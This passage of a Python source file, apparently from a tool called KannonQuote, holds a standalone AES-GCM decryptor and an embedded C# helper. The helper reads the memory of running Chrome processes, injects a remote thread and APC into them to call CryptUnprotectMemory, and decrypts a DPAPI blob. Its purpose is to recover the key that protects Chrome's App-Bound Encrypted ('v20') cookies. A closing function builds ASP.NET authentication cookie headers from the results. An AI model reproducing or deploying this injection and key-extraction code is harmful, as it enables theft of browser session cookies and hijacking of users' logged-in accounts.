        0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,
        0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,
        0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,
        0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,
        0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,
        0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,
        0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,
        0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,
        0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,
        0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,
        0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,
        0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,
        0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,
        0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,
        0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,
        0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16,
    ]
)
_AES_RCON = (0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1B, 0x36)


def _aes256_expand(key: bytes) -> list[bytes]:
    w = [key[i : i + 4] for i in range(0, 32, 4)]
    for i in range(8, 60):
        t = w[i - 1]
        if i % 8 == 0:
            t = bytes((_AES_SBOX[t[1]], _AES_SBOX[t[2]], _AES_SBOX[t[3]], _AES_SBOX[t[0]]))
            t = bytes((t[0] ^ _AES_RCON[i // 8], t[1], t[2], t[3]))
        elif i % 8 == 4:
            t = bytes(_AES_SBOX[b] for b in t)
        w.append(bytes(a ^ b for a, b in zip(w[i - 8], t)))
    return [b"".join(w[i : i + 4]) for i in range(0, 60, 4)]


def _aes256_encrypt_block(round_keys: list[bytes], block: bytes) -> bytes:
    s = [b ^ k for b, k in zip(block, round_keys[0])]

    def sub(state: list[int]) -> list[int]:
        return [_AES_SBOX[b] for b in state]

    def shift(state: list[int]) -> list[int]:
        return [
            state[0], state[5], state[10], state[15],
            state[4], state[9], state[14], state[3],
            state[8], state[13], state[2], state[7],
            state[12], state[1], state[6], state[11],
        ]

    def xtime(a: int) -> int:
        return ((a << 1) ^ 0x1B) & 0xFF if a & 0x80 else (a << 1) & 0xFF

    def mix(state: list[int]) -> list[int]:
        out = state[:]
        for c in range(4):
            i = 4 * c
            a, b, d, e = state[i : i + 4]
            out[i] = xtime(a) ^ xtime(b) ^ b ^ d ^ e
            out[i + 1] = a ^ xtime(b) ^ xtime(d) ^ d ^ e
            out[i + 2] = a ^ b ^ xtime(d) ^ xtime(e) ^ e
            out[i + 3] = xtime(a) ^ a ^ b ^ d ^ xtime(e)
        return out

    for r in range(1, 14):
        s = mix(shift(sub(s)))
        s = [b ^ k for b, k in zip(s, round_keys[r])]
    s = shift(sub(s))
    s = [b ^ k for b, k in zip(s, round_keys[14])]
    return bytes(s)


def _gf128_mul(x: bytes, y: bytes) -> bytes:
    x_int = int.from_bytes(x, "big")
    z = 0
    v = int.from_bytes(y, "big")
    for i in range(127, -1, -1):
        if (x_int >> i) & 1:
            z ^= v
        lsb = v & 1
        v >>= 1
        if lsb:
            v ^= 0xE1000000000000000000000000000000
    return z.to_bytes(16, "big")


def _ghash(h: bytes, data: bytes) -> bytes:
    y = b"\x00" * 16
    for i in range(0, len(data), 16):
        block = data[i : i + 16].ljust(16, b"\x00")
        y = _gf128_mul(bytes(a ^ b for a, b in zip(y, block)), h)
    return y


def _aes_gcm_decrypt_stdlib(payload: bytes, key: bytes) -> bytes:
    """AES-256-GCM, empty AAD, 12-byte nonce. No third-party crypto."""
    if len(key) != 32 or len(payload) < 28:
        return b""
    nonce = payload[:12]
    tag = payload[-16:]
    ciphertext = payload[12:-16]
    if not ciphertext:
        return b""
    rk = _aes256_expand(key)
    h = _aes256_encrypt_block(rk, b"\x00" * 16)
    j0 = nonce + b"\x00\x00\x00\x01"
    counter = bytearray(j0)
    plain = bytearray()
    for i in range(0, len(ciphertext), 16):
        n = int.from_bytes(counter[12:], "big") + 1
        counter[12:] = (n & 0xFFFFFFFF).to_bytes(4, "big")
        ks = _aes256_encrypt_block(rk, bytes(counter))
        chunk = ciphertext[i : i + 16]
        plain.extend(a ^ b for a, b in zip(chunk, ks[: len(chunk)]))
    gcm_len = (0).to_bytes(8, "big") + (len(ciphertext) * 8).to_bytes(8, "big")
    s = _ghash(h, ciphertext + b"\x00" * ((16 - len(ciphertext) % 16) % 16) + gcm_len)
    expect = bytes(a ^ b for a, b in zip(_aes256_encrypt_block(rk, j0), s))
    if expect != tag:
        return b""
    return bytes(plain)


def _aes_gcm_decrypt_bytes(payload: bytes, key: bytes) -> bytes:
    if len(payload) < 16 + 16 or not key:
        return b""
    nonce = payload[:12]
    cipher_tag = payload[12:]
    ciphertext, tag = cipher_tag[:-16], cipher_tag[-16:]
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM

        return AESGCM(key).decrypt(nonce, ciphertext + tag, None)
    except Exception:  # noqa: BLE001 — optional crypto / bad key
        try:
            from Crypto.Cipher import AES  # type: ignore[import-untyped]

            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            return cipher.decrypt_and_verify(ciphertext, tag)
        except Exception:  # noqa: BLE001
            got = _aes_gcm_decrypt_stdlib(payload, key)
            if got:
                return got
            return _aes_gcm_decrypt_bcrypt(payload, key)


# Memory-scan helper. stdin = v20 cookie sample; stdout = AES key or cand=<hex>.
# No ole32, no CoCreate, no LocalServer32, no elevation_service, no Program Files write.
_ABE_HELPER_CS = r"""
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

class K {
  [DllImport("kernel32.dll", SetLastError=true)]
  static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
  [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr h);
  [DllImport("kernel32.dll")]
  static extern int VirtualQueryEx(IntPtr h, IntPtr addr, out MEMORY_BASIC_INFORMATION mbi, int len);
  [DllImport("kernel32.dll", SetLastError=true)]
  static extern bool ReadProcessMemory(IntPtr h, IntPtr addr, byte[] buf, int n, out int read);
  [DllImport("ntdll.dll")]
  static extern int NtQueryInformationProcess(IntPtr h, int cls, IntPtr buf, int len, out int ret);
  [DllImport("kernel32.dll", SetLastError=true)]
  static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, UIntPtr s, uint t, uint p);
  [DllImport("kernel32.dll", SetLastError=true)]
  static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] buf, int n, out int w);
  [DllImport("kernel32.dll")]
  static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr sa, UIntPtr st, IntPtr start, IntPtr param, uint flags, out uint tid);
  [DllImport("kernel32.dll")]
  static extern uint WaitForSingleObject(IntPtr h, uint ms);
  [DllImport("kernel32.dll")]
  static extern uint ResumeThread(IntPtr t);
  [DllImport("ntdll.dll")]
  static extern int NtQueueApcThread(IntPtr t, IntPtr routine, IntPtr a1, IntPtr a2, IntPtr a3);
  [DllImport("kernel32.dll")]
  static extern IntPtr GetModuleHandle(string n);
  [DllImport("kernel32.dll")]
  static extern IntPtr GetProcAddress(IntPtr m, string n);
  [DllImport("kernel32.dll")]
  static extern IntPtr LoadLibrary(string n);
  [DllImport("kernel32.dll")]
  static extern bool VirtualProtectEx(IntPtr h, IntPtr a, UIntPtr s, uint p, out uint old);
  [DllImport("kernel32.dll", SetLastError=true)]
  static extern bool K32EnumProcessModules(IntPtr h, IntPtr[] mods, int size, out int needed);
  [DllImport("kernel32.dll", CharSet=CharSet.Unicode)]
  static extern uint K32GetModuleBaseNameW(IntPtr h, IntPtr m, System.Text.StringBuilder n, int c);
  [DllImport("crypt32.dll", SetLastError=true)]
  static extern bool CryptUnprotectData(ref DATA_BLOB din, IntPtr descr, IntPtr ent, IntPtr res, IntPtr prompt, uint flags, out DATA_BLOB dout);

  [StructLayout(LayoutKind.Sequential)]
  struct DATA_BLOB {
    public int cbData;
    public IntPtr pbData;
  }

  [DllImport("bcrypt.dll")]
  static extern int BCryptOpenAlgorithmProvider(out IntPtr ph, [MarshalAs(UnmanagedType.LPWStr)] string alg, [MarshalAs(UnmanagedType.LPWStr)] string impl, uint flags);
  [DllImport("bcrypt.dll")]
  static extern int BCryptSetProperty(IntPtr h, [MarshalAs(UnmanagedType.LPWStr)] string name, byte[] val, uint len, uint flags);
  [DllImport("bcrypt.dll")]
  static extern int BCryptGenerateSymmetricKey(IntPtr hAlg, out IntPtr hKey, IntPtr obj, uint objLen, byte[] secret, uint secretLen, uint flags);
  [DllImport("bcrypt.dll")]
  static extern int BCryptDecrypt(IntPtr hKey, byte[] input, uint inputLen, IntPtr padding, byte[] iv, uint ivLen, byte[] output, uint outputLen, out uint result, uint flags);
  [DllImport("bcrypt.dll")] static extern int BCryptDestroyKey(IntPtr h);
  [DllImport("bcrypt.dll")] static extern int BCryptCloseAlgorithmProvider(IntPtr h, uint flags);

  [StructLayout(LayoutKind.Sequential)]
  struct MEMORY_BASIC_INFORMATION {
    public IntPtr BaseAddress;
    public IntPtr AllocationBase;
    public uint AllocationProtect;
    public ushort PartitionId;
    public UIntPtr RegionSize;
    public uint State;
    public uint Protect;
    public uint Type;
  }

  [StructLayout(LayoutKind.Sequential)]
  struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO {
    public int cbSize;
    public int dwInfoVersion;
    public IntPtr pbNonce;
    public int cbNonce;
    public IntPtr pbAuthData;
    public int cbAuthData;
    public IntPtr pbTag;
    public int cbTag;
    public IntPtr pbMacContext;
    public int cbMacContext;
    public int cbAAD;
    public long cbData;
    public int dwFlags;
  }

  const uint PROCESS_VM_READ = 0x0010;
  const uint PROCESS_VM_WRITE = 0x0020;
  const uint PROCESS_VM_OPERATION = 0x0008;
  const uint PROCESS_CREATE_THREAD = 0x0002;
  const uint PROCESS_QUERY_INFORMATION = 0x0400;
  const uint PROCESS_QUERY_LIMITED = 0x1000;
  const uint MEM_COMMIT = 0x1000;
  const uint MEM_PRIVATE = 0x20000;
  const uint MEM_MAPPED = 0x40000;
  const uint MEM_IMAGE = 0x1000000;
  const uint PAGE_GUARD = 0x100;
  const int MAX_CAND = 20000;
  const int MAX_REGION = 32 * 1024 * 1024;
  const int MAX_BYTES = 256 * 1024 * 1024;
  const ulong PTR_MASK = 0x00007FFFFFFFFFF8UL;

  static IntPtr hAlgGlobal = IntPtr.Zero;
  static byte[] sampleNonce;
  static byte[] sampleCipher;
  static byte[] sampleTag;

  static void FailHr(string hr) {
    Console.Error.WriteLine("abe_hr=" + hr);
  }

  static bool HighEnt(byte[] b) {
    if (b == null || b.Length != 32) return false;
    var set = new bool[256];
    int n = 0;
    for (int i = 0; i < 32; i++) {
      int v = b[i] & 255;
      if (!set[v]) { set[v] = true; n++; }
    }
    return n >= 12;
  }

  static ulong Canon(ulong p) { return p & PTR_MASK; }

  static bool UserPtr(ulong p) {
    ulong a = Canon(p);
    return a >= 0x10000UL && a < 0x00007FFFFFFEFFFFUL;
  }

  [StructLayout(LayoutKind.Sequential)]
  struct UNICODE_STRING {
    public ushort Length;
    public ushort MaximumLength;
    public IntPtr Buffer;
  }

  static string CmdLine(int pid) {
    IntPtr h = OpenProcess(PROCESS_QUERY_LIMITED | PROCESS_VM_READ, false, pid);
    if (h == IntPtr.Zero) h = OpenProcess(PROCESS_QUERY_LIMITED, false, pid);
    if (h == IntPtr.Zero) return "";
    try {
      int ret;
      NtQueryInformationProcess(h, 60, IntPtr.Zero, 0, out ret);
      if (ret <= 0 || ret > 32768) return "";
      IntPtr buf = Marshal.AllocHGlobal(ret);
      try {
        if (NtQueryInformationProcess(h, 60, buf, ret, out ret) != 0) return "";
        var us = (UNICODE_STRING)Marshal.PtrToStructure(buf, typeof(UNICODE_STRING));
        if (us.Buffer == IntPtr.Zero || us.Length == 0) return "";
        return Marshal.PtrToStringUni(us.Buffer, us.Length / 2) ?? "";
      } finally { Marshal.FreeHGlobal(buf); }
    } catch { return ""; }
    finally { CloseHandle(h); }
  }

  static bool SkipPid(string cmd) {
    if (string.IsNullOrEmpty(cmd)) return false;
    string c = cmd.ToLowerInvariant();
    return c.Contains("--type=renderer") || c.Contains("--type=gpu")
      || c.Contains("crashpad-handler") || c.Contains("type=crashpad");
  }

  static bool PreferPid(string cmd) {
    if (string.IsNullOrEmpty(cmd)) return true;
    string c = cmd.ToLowerInvariant();
    if (c.Contains("network.mojom.networkservice") || c.Contains("service-sandbox-type=network"))
      return true;
    return !c.Contains("--type=");
  }

  static bool AbePid(int pid) {
    return !SkipPid(CmdLine(pid));
  }

  static bool InitAes(byte[] sample) {
    if (sample == null || sample.Length < 32) return false;
    if (sample[0] != (byte)'v' || sample[1] != (byte)'2' || sample[2] != (byte)'0') return false;
    int ctLen = sample.Length - 3 - 12 - 16;
    if (ctLen <= 0) return false;
    sampleNonce = new byte[12];
    sampleCipher = new byte[ctLen];
    sampleTag = new byte[16];
    Buffer.BlockCopy(sample, 3, sampleNonce, 0, 12);
    Buffer.BlockCopy(sample, 15, sampleCipher, 0, ctLen);
    Buffer.BlockCopy(sample, 15 + ctLen, sampleTag, 0, 16);
    if (BCryptOpenAlgorithmProvider(out hAlgGlobal, "AES", null, 0) != 0) return false;
    byte[] gcm = Encoding.Unicode.GetBytes("ChainingModeGCM\0");
    return BCryptSetProperty(hAlgGlobal, "ChainingMode", gcm, (uint)gcm.Length, 0) == 0;
  }

  static bool AesGcmOk(byte[] key) {
    if (hAlgGlobal == IntPtr.Zero || !HighEnt(key)) return false;
    IntPtr hKey = IntPtr.Zero;
    GCHandle nPin = GCHandle.Alloc(sampleNonce, GCHandleType.Pinned);
    GCHandle tPin = GCHandle.Alloc(sampleTag, GCHandleType.Pinned);
    try {
      if (BCryptGenerateSymmetricKey(hAlgGlobal, out hKey, IntPtr.Zero, 0, key, 32, 0) != 0) return false;
      var info = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO();
      info.cbSize = Marshal.SizeOf(typeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));
      info.dwInfoVersion = 1;
      info.pbNonce = nPin.AddrOfPinnedObject();
      info.cbNonce = 12;
      info.pbTag = tPin.AddrOfPinnedObject();
      info.cbTag = 16;
      IntPtr pInfo = Marshal.AllocHGlobal(info.cbSize);
      try {
        Marshal.StructureToPtr(info, pInfo, false);
        byte[] output = new byte[sampleCipher.Length];
        uint got = 0;
        return BCryptDecrypt(hKey, sampleCipher, (uint)sampleCipher.Length, pInfo, null, 0, output, (uint)output.Length, out got, 0) == 0;
      } finally { Marshal.FreeHGlobal(pInfo); }
    } catch { return false; }
    finally {
      nPin.Free();
      tPin.Free();
      if (hKey != IntPtr.Zero) BCryptDestroyKey(hKey);
    }
  }

  static void Win(byte[] key) {
    var so = Console.OpenStandardOutput();
    so.Write(key, 0, key.Length);
    so.Flush();
    Environment.Exit(0);
  }

  static byte[] ReadN(IntPtr h, ulong addr, int n) {
    byte[] key = new byte[n];
    int read;
    if (!ReadProcessMemory(h, new IntPtr((long)Canon(addr)), key, n, out read) || read != n) return null;
    return key;
  }

  static IntPtr RemoteExport(IntPtr h, string dll, string fn) {
    IntPtr localBase = GetModuleHandle(dll);
    if (localBase == IntPtr.Zero) localBase = LoadLibrary(dll);
    if (localBase == IntPtr.Zero) return IntPtr.Zero;
    IntPtr local = GetProcAddress(localBase, fn);
    if (local == IntPtr.Zero) return IntPtr.Zero;
    long rva = local.ToInt64() - localBase.ToInt64();
    IntPtr[] mods = new IntPtr[1024];
    int needed;
    if (!K32EnumProcessModules(h, mods, mods.Length * IntPtr.Size, out needed)) return local;
    int count = needed / IntPtr.Size;
    if (count > mods.Length) count = mods.Length;
    var sb = new StringBuilder(260);
    for (int i = 0; i < count; i++) {
      sb.Length = 0;
      if (K32GetModuleBaseNameW(h, mods[i], sb, 260) > 0
          && sb.ToString().Equals(dll, StringComparison.OrdinalIgnoreCase))
        return new IntPtr(mods[i].ToInt64() + rva);
    }
    return local;
  }

  static bool SetupUnprotect(IntPtr h, out IntPtr data, out IntPtr unprotect, out IntPtr alert) {
    data = IntPtr.Zero; unprotect = IntPtr.Zero; alert = IntPtr.Zero;
    unprotect = RemoteExport(h, "crypt32.dll", "CryptUnprotectMemory");
    alert = RemoteExport(h, "ntdll.dll", "NtTestAlert");
    if (unprotect == IntPtr.Zero || alert == IntPtr.Zero) return false;
    data = VirtualAllocEx(h, IntPtr.Zero, new UIntPtr(32), 0x3000, 0x04);
    return data != IntPtr.Zero;
  }

  static byte[] RemoteUnprotect(IntPtr h, IntPtr data, IntPtr unprotect, IntPtr alert, byte[] key) {
    if (h == IntPtr.Zero || data == IntPtr.Zero || unprotect == IntPtr.Zero || alert == IntPtr.Zero
        || key == null || key.Length != 32)
      return null;
    int w;
    if (!WriteProcessMemory(h, data, key, 32, out w)) return null;
    uint tid;
    IntPtr th = CreateRemoteThread(h, IntPtr.Zero, UIntPtr.Zero, alert, IntPtr.Zero, 4, out tid);
    if (th == IntPtr.Zero) return null;
    try {
      if (NtQueueApcThread(th, unprotect, data, new IntPtr(32), new IntPtr(0)) < 0) return null;
      ResumeThread(th);
      if (WaitForSingleObject(th, 200) != 0) return null;
    } finally { CloseHandle(th); }
    byte[] plain = new byte[32];
    int r;
    if (!ReadProcessMemory(h, data, plain, 32, out r) || r != 32) return null;
    for (int i = 0; i < 32; i++) if (plain[i] != key[i]) return plain;
    return null;
  }

  static void TryKey(byte[] key, List<byte[]> found, HashSet<string> seen, IntPtr h, IntPtr data, IntPtr unprotect, IntPtr alert) {
    if (key == null || !HighEnt(key)) return;
    string hex = BitConverter.ToString(key);
    if (!seen.Add(hex)) return;
    found.Add(key);
    if (AesGcmOk(key)) Win(key);
    byte[] plain = RemoteUnprotect(h, data, unprotect, alert, key);
    if (plain != null && AesGcmOk(plain)) Win(plain);
  }

  static void ScanPid(int pid, List<byte[]> found, HashSet<string> seen, ref int scanned, int deadline) {
    uint access = PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD
      | PROCESS_QUERY_INFORMATION | PROCESS_QUERY_LIMITED;
    IntPtr h = OpenProcess(access, false, pid);
    if (h == IntPtr.Zero) h = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_QUERY_LIMITED, false, pid);
    if (h == IntPtr.Zero) return;
    IntPtr data, unprotect, alert;
    SetupUnprotect(h, out data, out unprotect, out alert);
    try {
      long addr = 0;
      var mbi = new MEMORY_BASIC_INFORMATION();
      int mbiSize = Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION));
      while (addr >= 0 && addr < 0x00007FFFFFFEFFFF && scanned < MAX_BYTES && found.Count < MAX_CAND) {
        if (Environment.TickCount > deadline) break;
        int q = VirtualQueryEx(h, new IntPtr(addr), out mbi, mbiSize);
        if (q == 0) break;
        long size = (long)mbi.RegionSize;
        if (size <= 0) break;
        uint prot = mbi.Protect;
        uint mtype = mbi.Type;
        bool typeOk = mtype == MEM_PRIVATE || mtype == MEM_MAPPED
          || (mtype == MEM_IMAGE && ((prot & 0xFFu) == 0x04 || (prot & 0xFFu) == 0x08));
        bool ok = mbi.State == MEM_COMMIT
          && typeOk
          && (prot & PAGE_GUARD) == 0
          && ((prot & 0xFFu) == 0x02 || (prot & 0xFFu) == 0x04 || (prot & 0xFFu) == 0x08 || (prot & 0xFFu) == 0x40)
          && size <= MAX_REGION;
        if (ok) {
          int n = (int)size;
          byte[] buf = new byte[n];
          int read;
          if (ReadProcessMemory(h, mbi.BaseAddress, buf, n, out read) && read >= 16) {
            scanned += read;
            for (int i = 0; i + 4 <= read && found.Count < MAX_CAND; i++) {
              if (buf[i] != (byte)'v' || buf[i+1] != (byte)'2' || buf[i+2] != (byte)'0' || buf[i+3] != 0)
                continue;
              int[] bases = (i > 0) ? new int[] { i, i - 1, i & ~7 } : new int[] { i, i & ~7 };
              foreach (int b in bases) {
                if (b < 0 || b + 40 > read) continue;
                int[] offs = new int[] { 32, 40, 48 };
                foreach (int off in offs) {
                  if (b + off + 16 > read) continue;
                  ulong begin = BitConverter.ToUInt64(buf, b + off);
                  if (!UserPtr(begin)) continue;
                  ulong finish = BitConverter.ToUInt64(buf, b + off + 8);
                  bool marked = off == 32 && b + 29 <= read && buf[b+23] == 3 && buf[b+24] == 0
                    && buf[b+25] == 0 && buf[b+26] == 0 && buf[b+27] == 0 && buf[b+28] == 1;
                  if (marked || finish == begin + 32UL)
                    TryKey(ReadN(h, begin, 32), found, seen, h, data, unprotect, alert);
                }
              }
            }
            for (int i = 0; i + 24 <= read && found.Count < MAX_CAND; i += 8) {
              ulong start = BitConverter.ToUInt64(buf, i);
              ulong finish = BitConverter.ToUInt64(buf, i + 8);
              ulong capv = BitConverter.ToUInt64(buf, i + 16);
              if (UserPtr(start) && UserPtr(finish) && UserPtr(capv)
                  && finish == start + 32 && capv >= finish && capv - start <= 0x10000UL)
                TryKey(ReadN(h, start, 32), found, seen, h, data, unprotect, alert);
            }
          }
        }
        long next = addr + size;
        if (next <= addr) break;
        addr = next;
      }
    } finally { CloseHandle(h); }
  }

  static List<int> Pids() {
    var raw = new List<int>();
    string env = Environment.GetEnvironmentVariable("KANNON_CHROME_PIDS");
    if (!string.IsNullOrEmpty(env)) {
      foreach (var part in env.Split(',')) {
        int pid;
        if (int.TryParse(part.Trim(), out pid) && pid > 0) raw.Add(pid);
      }
    }
    if (raw.Count == 0) {
      try {
        foreach (var p in Process.GetProcessesByName("chrome")) {
          try { raw.Add(p.Id); } catch {}
        }
      } catch {}
    }
    var prefer = new List<int>();
    var rest = new List<int>();
    foreach (int pid in raw) {
      string cmd = CmdLine(pid);
      if (SkipPid(cmd)) continue;
      if (PreferPid(cmd)) prefer.Add(pid);
      else rest.Add(pid);
    }
    if (prefer.Count + rest.Count > 0) {
      prefer.AddRange(rest);
      return prefer;
    }
    return raw;
  }

  static byte[] UnprotectOnce(byte[] blob, uint flags) {
    if (blob == null || blob.Length < 24) return null;
    DATA_BLOB din = new DATA_BLOB();
    din.cbData = blob.Length;
    din.pbData = Marshal.AllocHGlobal(blob.Length);
    Marshal.Copy(blob, 0, din.pbData, blob.Length);
    try {
      DATA_BLOB dout;
      if (!CryptUnprotectData(ref din, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, flags, out dout))
        return null;
      if (dout.pbData == IntPtr.Zero || dout.cbData <= 0) return null;
      byte[] plain = new byte[dout.cbData];
      Marshal.Copy(dout.pbData, plain, 0, dout.cbData);
      return plain;
    } catch { return null; }
    finally { Marshal.FreeHGlobal(din.pbData); }
  }

  static byte[] UnprotectAppb() {
    string path = Environment.GetEnvironmentVariable("KANNON_APPB_PATH");
    if (string.IsNullOrEmpty(path)) {
      string local = Environment.GetEnvironmentVariable("LOCALAPPDATA");
      if (!string.IsNullOrEmpty(local))
        path = Path.Combine(local, "KannonQuote", "abe", "appb.bin");
    }
    if (string.IsNullOrEmpty(path) || !File.Exists(path)) return null;
    byte[] blob = File.ReadAllBytes(path);
    if (blob.Length >= 4 && blob[0]==(byte)'A' && blob[1]==(byte)'P' && blob[2]==(byte)'P' && blob[3]==(byte)'B') {
      byte[] t = new byte[blob.Length-4];
      Buffer.BlockCopy(blob, 4, t, 0, t.Length);
      blob = t;
    }
    var slices = new List<byte[]>();
    slices.Add(blob);
    for (int i = 1; i + 4 <= blob.Length && slices.Count < 4; i++) {
      if (blob[i]==1 && blob[i+1]==0 && blob[i+2]==0 && blob[i+3]==0) {
        byte[] s = new byte[blob.Length-i];
        Buffer.BlockCopy(blob, i, s, 0, s.Length);
        slices.Add(s);
      }
    }
    uint[] flagList = new uint[] { 0, 1, 4, 5 };
    foreach (var slice in slices) {
      foreach (uint f in flagList) {
        byte[] plain = UnprotectOnce(slice, f);
        for (int nest = 0; nest < 3 && plain != null; nest++) {
          if (plain.Length >= 4 && plain[0]==1 && plain[1]==0 && plain[2]==0 && plain[3]==0) {
            byte[] inner = UnprotectOnce(plain, 0);
            if (inner == null) break;
            plain = inner;
            continue;
          }
          break;
        }
        if (plain != null) return plain;
      }
    }
    return null;
  }

  static int Main() {
    byte[] sample;
    using (var stdin = Console.OpenStandardInput())
    using (var ms = new MemoryStream()) {
      stdin.CopyTo(ms);
      sample = ms.ToArray();
    }
    if (sample.Length < 32 || sample[0] != (byte)'v' || sample[1] != (byte)'2' || sample[2] != (byte)'0') {
      FailHr("no_v20_sample");
      return 2;
    }
    if (!InitAes(sample)) { FailHr("memscan:aes"); return 6; }
    byte[] appbPlain = UnprotectAppb();
    if (appbPlain != null) {
      if (appbPlain.Length == 32 && AesGcmOk(appbPlain)) Win(appbPlain);
      if (appbPlain.Length >= 32) {
        byte[] last = new byte[32];
        Buffer.BlockCopy(appbPlain, appbPlain.Length - 32, last, 0, 32);
        if (AesGcmOk(last)) Win(last);
        byte[] first = new byte[32];
        Buffer.BlockCopy(appbPlain, 0, first, 0, 32);
        if (AesGcmOk(first)) Win(first);
      }
      if (appbPlain.Length >= 8) {
        int n = BitConverter.ToInt32(appbPlain, 0);
        if (n >= 0 && n < appbPlain.Length && 4 + n + 4 <= appbPlain.Length) {
          int n2 = BitConverter.ToInt32(appbPlain, 4 + n);
          if (n2 == 32 && 8 + n + 32 <= appbPlain.Length) {
            byte[] key = new byte[32];
            Buffer.BlockCopy(appbPlain, 8 + n, key, 0, 32);
            if (AesGcmOk(key)) Win(key);
          }
        }
      }
    }
    var pids = Pids();
    if (pids.Count == 0) { FailHr("memscan:no_chrome"); return 3; }
    var found = new List<byte[]>();
    var seen = new HashSet<string>();
    int scanned = 0;
    int deadline = Environment.TickCount + 4500;
    int opened = 0;
    foreach (int pid in pids) {
      IntPtr probe = OpenProcess(PROCESS_QUERY_LIMITED, false, pid);
      if (probe != IntPtr.Zero) { CloseHandle(probe); opened++; }
      ScanPid(pid, found, seen, ref scanned, deadline);
      if (found.Count >= MAX_CAND || Environment.TickCount > deadline) break;
    }
    if (hAlgGlobal != IntPtr.Zero) BCryptCloseAlgorithmProvider(hAlgGlobal, 0);
    if (opened == 0 && found.Count == 0) { FailHr("memscan:OpenProcess"); return 4; }
    if (found.Count == 0) { FailHr("memscan:no_cand"); return 5; }
    int dumped = 0;
    foreach (var key in found) {
      if (dumped >= 80) break;
      Console.WriteLine("cand=" + BitConverter.ToString(key).Replace("-", ""));
      dumped++;
    }
    FailHr("memscan:cands=" + found.Count);
    return 1;
  }
}
"""


def _assemble_cookie_header(pairs: list[tuple[str, str]]) -> str:
    """Keep last value per name; prefer known Finish cookies when present."""
    by_name: dict[str, str] = {}
    for name, value in pairs:
        if not name or not value:
            continue
        by_name[name] = value
    if not by_name:
        return ""
    # A session is usable when ASP.NET auth or at least a session id exists.
    has_auth = any(
        n in by_name
        for n in (
            ".AspNet.ApplicationCookie",
            ".AspNet.Cookies",
            ".AspNetCore.Cookies",
            "ASP.NET_SessionId",
        )
    )
    if not has_auth:
        return ""
    ordered: list[str] = []
    seen: set[str] = set()
    for name in COOKIE_NAMES:
        if name in by_name and name not in seen:
            ordered.append(f"{name}={by_name[name]}")
            seen.add(name)
    for name, value in by_name.items():
        if name in seen:
            continue
        ordered.append(f"{name}={value}")
        seen.add(name)
    return "; ".join(ordered)
